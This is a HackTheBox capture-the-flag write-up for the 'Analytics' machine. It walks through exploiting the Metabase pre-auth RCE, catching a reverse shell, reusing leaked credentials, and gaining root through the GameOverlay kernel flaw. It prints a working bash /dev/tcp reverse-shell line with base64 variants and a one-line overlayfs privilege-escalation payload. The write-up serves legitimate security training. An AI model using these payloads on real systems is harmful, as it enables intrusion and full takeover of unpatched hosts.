---
layout: post
title: HackTheBox Analytics
date: 2023-10-07
tags: [HackTheBox, Linux, Easy]
---

# Machine Synopsis

Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges. ([Source](https://app.hackthebox.com/machines/Analytics/information))

# Enumeration

```bash
$ nmap -sC -sV 10.10.11.233
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.233
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.32 seconds
```

Here is the website.



![webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Analytics/webpage.png?raw=true)

Here is the login page.

![login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Analytics/login.png?raw=true)

Default credentials did not work.



# Exploitation

Doing a research on Metabase and its vulnerabilities resulted in this article explaining [CVE-2023-38646](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646).

From the article, we can exploit the vulnerability using a valid `session-token`, the `/api/setup/validate` endpoint, and a crafted payload (which was provided in the article).

![session_token](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Analytics/session_token.png?raw=true)

![burp_reverse_shell](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Analytics/burp_reverse_shell.png?raw=true)

>   **Note**: The base64 payload cannot have equal sign, therefore we need to pad the original payload with spaces at the end to obtain a base64 payload without spaces.
>
>   ``` bash
>   # with no space padded
>   bash -i >&/dev/tcp/10.10.14.16/9998 0>&1
>   YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE2Lzk5OTggMD4mMQ==
>   
>   # with one space padded
>   bash -i >&/dev/tcp/10.10.14.16/9998 0>&1 
>   YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE2Lzk5OTggMD4mMSA=
>   
>   # with two spaces padded
>   bash -i >&/dev/tcp/10.10.14.16/9998 0>&1  
>   YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE2Lzk5OTggMD4mMSAg
>   ```

```bash
$ nc -nlvp 9998
listening on [any] 9998 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.233] 39952
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
b0bc01f6c5ef:/$ whoami
metabase
```

This looks like a docker container due to the random characters hostname.

```bash
b0bc01f6c5ef:/$ ls -la
total 88
drwxr-xr-x    1 root     root          4096 May 17 12:53 .
drwxr-xr-x    1 root     root          4096 May 17 12:53 ..
-rwxr-xr-x    1 root     root             0 May 17 12:53 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29  2023 app
drwxr-xr-x    1 root     root          4096 Jun 29  2023 bin
drwxr-xr-x    5 root     root           340 May 17 12:53 dev
drwxr-xr-x    1 root     root          4096 May 17 12:53 etc
drwxr-xr-x    1 root     root          4096 Aug  3  2023 home
drwxr-xr-x    1 root     root          4096 Jun 14  2023 lib
drwxr-xr-x    5 root     root          4096 Jun 14  2023 media
drwxr-xr-x    1 metabase metabase      4096 Aug  3  2023 metabase.db
drwxr-xr-x    2 root     root          4096 Jun 14  2023 mnt
drwxr-xr-x    1 root     root          4096 Jun 15  2023 opt
drwxrwxrwx    1 root     root          4096 Aug  7  2023 plugins
dr-xr-xr-x  210 root     root             0 May 17 12:53 proc
drwx------    1 root     root          4096 Aug  3  2023 root
drwxr-xr-x    2 root     root          4096 Jun 14  2023 run
drwxr-xr-x    2 root     root          4096 Jun 14  2023 sbin
drwxr-xr-x    2 root     root          4096 Jun 14  2023 srv
dr-xr-xr-x   13 root     root             0 May 17 12:53 sys
drwxrwxrwt    1 root     root          4096 Aug  3  2023 tmp
drwxr-xr-x    1 root     root          4096 Jun 29  2023 usr
drwxr-xr-x    1 root     root          4096 Jun 14  2023 var

b0bc01f6c5ef:/$ env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=b0bc01f6c5ef
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Checked the environment variables of the docker container and found a username and password. This credentials were reused for SSH.

```bash
$ ssh metalytics@10.10.11.233
...
metalytics@analytics:~$
```

# Privilege Escalation

Performed enumeration on the host.

```bash
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics: 
Sorry, user metalytics may not run sudo on localhost.

metalytics@analytics:~$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

It turns out that this Ubuntu kernel version was vulnerable to [CVE-2023-2640 and CVE-2023-32629](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/). 

```bash
# payload to escalate privileges
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```



